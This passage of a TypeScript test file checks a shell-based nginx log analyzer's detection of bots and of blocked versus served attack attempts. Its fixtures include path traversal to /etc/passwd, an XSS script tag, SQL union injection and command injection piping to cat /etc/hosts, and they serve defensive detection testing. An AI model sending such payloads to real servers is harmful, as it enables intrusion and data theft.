    const script = readFileSync(path.join(scriptsDir, 'log-analyzer.sh'), 'utf8');
    const regex = /^KNOWN_BOT_REGEX='([^']+)'$/m.exec(script)?.[1] ?? '';
    expect(Object.keys(KNOWN_BOTS).sort()).toEqual(regex.split('|').sort());
  });

  it.each(Object.entries(KNOWN_BOTS))('skips %s', (_name, userAgent) => {
    const report = runAnalyzer(sandbox(), requests([userAgent]));
    expect(agentRows(report)).toEqual([]);
  });

  it.each([
    ['lower case', (agent: string) => agent.toLowerCase()],
    ['upper case', (agent: string) => agent.toUpperCase()],
  ])('skips known bots written in %s', (_name, transform) => {
    const agents = Object.values(KNOWN_BOTS).map(transform);
    expect(agentRows(runAnalyzer(sandbox(), requests(agents)))).toEqual([]);
  });

  it('still reports unknown bots, crawlers and attack tools, most frequent first', () => {
    const rows = agentRows(runAnalyzer(sandbox(), requests([...Object.values(KNOWN_BOTS), ...UNKNOWN, UNKNOWN[0]])));
    expect(rows[0]).toBe('  2 - EvilScraperBot/3.0');
    // Agents seen once are listed in no guaranteed order.
    expect(rows.slice(1).sort()).toEqual(UNKNOWN.slice(1).map((agent) => `  1 - ${agent}`).sort());
  });

  it.each([
    'sqlmap/1.7 (compatible; Googlebot/2.1)',
    'Nikto/2.5 Mozilla/5.0 bingbot/2.0',
    'acunetix-scan; GPTBot/1.4',
    'Mozilla/5.0 (compatible; PortScanner/1.0; +http://www.google.com/bot.html) Googlebot/2.1',
    'SQLMAP/1.7 GOOGLEBOT',
  ])('reports an attack tool that also names a known bot: %s', (userAgent) => {
    expect(agentRows(runAnalyzer(sandbox(), requests([userAgent])))).toEqual([`  1 - ${userAgent}`]);
  });

  it('lists the agent of a request whose URL or referrer carries a hostile keyword, as it did before', () => {
    const lines = [
      nginxLine('/x?probe=sqlmap', { userAgent: 'Mozilla/5.0 (X11; Linux x86_64)' }),
      nginxLine('/', { userAgent: 'Mozilla/5.0 (X11; Linux x86_64)', referrer: 'https://example.test/crawler' }),
    ];
    expect(agentRows(runAnalyzer(sandbox(), lines))).toEqual(['  2 - Mozilla/5.0 (X11; Linux x86_64)']);
  });

  it('does not let a known bot name in the URL or referrer hide another agent', () => {
    const lines = [
      nginxLine('/x?via=googlebot', { userAgent: 'EvilScraperBot/3.0' }),
      nginxLine('/', { userAgent: 'EvilScraperBot/3.0', referrer: 'https://example.test/gptbot' }),
    ];
    expect(agentRows(runAnalyzer(sandbox(), lines))).toEqual(['  2 - EvilScraperBot/3.0']);
  });

  it.runIf(hasJq)('reports the same agents in the JSON report', () => {
    const json = JSON.parse(
      runAnalyzer(sandbox(), requests([...Object.values(KNOWN_BOTS), ...UNKNOWN, UNKNOWN[0]]), ['--format', 'json']).stdout,
    );
    expect(json.suspiciousUserAgents[0]).toEqual({ count: 2, agent: 'EvilScraperBot/3.0' });
    expect(json.suspiciousUserAgents.slice(1).sort((a: { agent: string }, b: { agent: string }) => a.agent.localeCompare(b.agent))).toEqual(
      UNKNOWN.slice(1).map((agent) => ({ count: 1, agent })).sort((a, b) => a.agent.localeCompare(b.agent)),
    );
  });

  it.runIf(hasJq)('gives an empty list in the JSON report when only known bots visit', () => {
    const json = JSON.parse(runAnalyzer(sandbox(), requests(Object.values(KNOWN_BOTS)), ['--format', 'json']).stdout);
    expect(json.suspiciousUserAgents).toEqual([]);
  });
});

describe('log-analyzer.sh blocked versus served attack attempts', () => {
  const TRAVERSAL = '/..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd';
  const SERVED_NOTE = 'Answered with 2xx/3xx (not blocked, review these)';
  const BLOCKED_NOTE = 'None answered with 2xx/3xx';

  it('says none was answered with 2xx/3xx when nginx refused them all', () => {
    const lines = [nginxLine(TRAVERSAL, { status: 400 }), nginxLine(TRAVERSAL, { status: 400 }), ...ORDINARY_TRAFFIC];
    const report = runAnalyzer(sandbox(), lines);
    expect(traversalSection(report)).toContain('Detected 2 potential path traversal attempts');
    expect(traversalSection(report)).toContain(BLOCKED_NOTE);
    expect(traversalSection(report)).not.toContain(SERVED_NOTE);
    expect(report.summary).toContain(BLOCKED_NOTE);
    expect(report.summary).not.toContain(SERVED_NOTE);
  });

  it('counts a 2xx and a 3xx answer as served, but not a 4xx or 5xx (a 5xx still shows in the 5xx section)', () => {
    const lines = [nginxLine(TRAVERSAL, { status: 200 }), nginxLine(`${TRAVERSAL}x`, { status: 301 }), nginxLine(TRAVERSAL, { status: 400 }), nginxLine(TRAVERSAL, { status: 404 }), nginxLine(TRAVERSAL, { status: 500 })];
    const report = runAnalyzer(sandbox(), lines);
    const section = traversalSection(report);
    expect(section).toContain('Detected 5 potential path traversal attempts');
    expect(section).toContain(`${SERVED_NOTE}: 2\n`);
    expect(section).toContain(`    200 203.0.113.7 GET ${TRAVERSAL} HTTP/1.1\n`);
    expect(section).toContain(`    301 203.0.113.7 GET ${TRAVERSAL}x HTTP/1.1\n`);
    expect(section).not.toContain(BLOCKED_NOTE);
    expect(report.summary).toContain(`${SERVED_NOTE}: 2\n`);
    expect(report.summary).toContain(totalAttacks(5));
  });

  it('lists a served request in the text report even when it is not among the sample lines', () => {
    const blocked = Array.from({ length: 5 }, (_, i) => nginxLine(`${TRAVERSAL}${i}`, { status: 400, ip: '198.51.100.1' }));
    const served = nginxLine(`${TRAVERSAL}${'a'.repeat(200)}`, { status: 200, ip: '198.51.100.2' });
    const section = traversalSection(runAnalyzer(sandbox(), [...blocked, served]));
    expect(sampleLines(section, '198.51.100.2')).toEqual([]);
    expect(section).toContain(`    200 198.51.100.2 GET ${TRAVERSAL}${'a'.repeat(100 - TRAVERSAL.length - 4)}\n`);
  });

  it('judges each category on its own', () => {
    const lines = [nginxLine(TRAVERSAL, { status: 400 }), nginxLine('/x?q=<script>alert(1)</script>', { status: 200 })];
    const report = runAnalyzer(sandbox(), lines);
    expect(traversalSection(report)).toContain(BLOCKED_NOTE);
    expect(xssSection(report)).toContain(`${SERVED_NOTE}: 1\n`);
    expect(report.summary).toContain(`${SERVED_NOTE}: 1\n`);
  });

  it('covers the SQL and command injection sections too', () => {
    const sql = nginxLine('/x?id=1%20union%20select%201', { status: 200 });
    const command = nginxLine('/x?f=a|cat+/etc/hosts', { status: 403 });
    const report = runAnalyzer(sandbox(), [sql, command]);
    expect(sqlSection(report)).toContain(`${SERVED_NOTE}: 1\n`);
    expect(commandSection(report)).toContain(BLOCKED_NOTE);
  });

  it('counts every served request but lists and samples only five', () => {
    const lines = Array.from({ length: 8 }, (_, i) => nginxLine(`${TRAVERSAL}${i}`, { status: 200 }));
    const report = runAnalyzer(sandbox(), lines);
    const section = traversalSection(report);
    expect(section).toContain(`${SERVED_NOTE}: 8\n`);
    expect(section.match(/^ {4}200 203\.0\.113\.7 GET /gm)).toHaveLength(5);
    expect(report.summary).toContain(`${SERVED_NOTE}: 8\n`);
    if (hasJq) {
      const json = JSON.parse(runAnalyzer(sandbox(), lines, ['--format', 'json']).stdout);
      expect(json.securityFindings[0]).toMatchObject({ count: 8, served: 8 });
      expect(json.securityFindings[0].servedSamples).toHaveLength(5);
    }
  });

  it('counts a request in two categories once in the total and once in each category', () => {
    const both = nginxLine('/x?f=../../etc/passwd|cat /etc/hosts', { status: 200 });
    const report = runAnalyzer(sandbox(), [both]);
    expect(traversalSection(report)).toContain(`${SERVED_NOTE}: 1\n`);
    expect(commandSection(report)).toContain(`${SERVED_NOTE}: 1\n`);
    expect(report.summary).toContain(`${SERVED_NOTE}: 1\n`);
    if (hasJq) {
      const json = JSON.parse(runAnalyzer(sandbox(), [both], ['--format', 'json']).stdout);
      expect(json.summary).toMatchObject({ totalAttackAttempts: 1, servedAttackAttempts: 1 });
      expect(json.securityFindings.map((f: { served: number }) => f.served)).toEqual([1, 1]);
    }
  });

  it("ignores another day's served request when today's attempts were blocked", () => {
    const lines = [nginxLine(TRAVERSAL, { status: 200, date: YESTERDAY }), nginxLine(TRAVERSAL, { status: 400 })];
    const report = runAnalyzer(sandbox(), lines);
    expect(traversalSection(report)).toContain(BLOCKED_NOTE);
    expect(report.summary).toContain(BLOCKED_NOTE);
    expect(report.summary).not.toContain(SERVED_NOTE);
  });

  it.each([
    [199, false],
    [200, true],
    [299, true],
    [399, true],
    [400, false],
    [444, false],
    [499, false],
    [500, false],
    [600, false],
  ])('treats status %i as served: %s', (status, served) => {
    const report = runAnalyzer(sandbox(), [nginxLine(TRAVERSAL, { status })]);
    expect(traversalSection(report)).toContain(served ? `${SERVED_NOTE}: 1\n` : BLOCKED_NOTE);
  });

  it('lists a served request and its JSON for SQL injection, XSS and command injection', () => {
    const sql = nginxLine('/x?id=1%20union%20select%201', { status: 200 });
    const xss = nginxLine('/x?q=<script>alert(1)</script>', { status: 302 });
    const command = nginxLine('/x?f=a|cat+/etc/hosts', { status: 200 });
    const report = runAnalyzer(sandbox(), [sql, xss, command]);
    expect(sqlSection(report)).toContain('    200 203.0.113.7 GET /x?id=1%20union%20select%201 HTTP/1.1\n');
    expect(xssSection(report)).toContain('    302 203.0.113.7 GET /x?q=<script>alert(1)</script> HTTP/1.1\n');
    expect(commandSection(report)).toContain('    200 203.0.113.7 GET /x?f=a|cat+/etc/hosts HTTP/1.1\n');
    if (hasJq) {
      const json = JSON.parse(runAnalyzer(sandbox(), [sql, xss, command], ['--format', 'json']).stdout);
      const byCategory = Object.fromEntries(json.securityFindings.map((f: { category: string }) => [f.category, f]));
      expect(byCategory['SQL Injection']).toMatchObject({ served: 1, servedSamples: [sql] });
      expect(byCategory['Cross-Site Scripting (XSS)']).toMatchObject({ served: 1, servedSamples: [xss] });
      expect(byCategory['Command Injection']).toMatchObject({ served: 1, servedSamples: [command] });
      expect(json.summary.servedAttackAttempts).toBe(3);
    }
  });

  it('prints no verdict when there are no attempts', () => {
    const report = runAnalyzer(sandbox(), ORDINARY_TRAFFIC);
    expect(report.stdout).not.toContain(SERVED_NOTE);
    expect(report.stdout).not.toContain(BLOCKED_NOTE);
  });

  it.runIf(hasJq)('adds served counts and samples to the JSON report', () => {
    const served = nginxLine(TRAVERSAL, { status: 200 });
    const lines = [served, nginxLine(TRAVERSAL, { status: 400 }), nginxLine('/x?q=<script>', { status: 400 })];
    const json = JSON.parse(runAnalyzer(sandbox(), lines, ['--format', 'json']).stdout);
    expect(json.summary.totalAttackAttempts).toBe(3);
    expect(json.summary.servedAttackAttempts).toBe(1);
    const byCategory = Object.fromEntries(json.securityFindings.map((f: { category: string }) => [f.category, f]));
    expect(byCategory['Path Traversal']).toMatchObject({ count: 2, served: 1, servedSamples: [served] });
    expect(byCategory['Cross-Site Scripting (XSS)']).toMatchObject({ count: 1, served: 0, servedSamples: [] });
  });

  it.runIf(hasJq)('reports zero served attempts in a clean JSON report', () => {
    const json = JSON.parse(runAnalyzer(sandbox(), ORDINARY_TRAFFIC, ['--format', 'json']).stdout);
    expect(json.summary.servedAttackAttempts).toBe(0);
  });
});
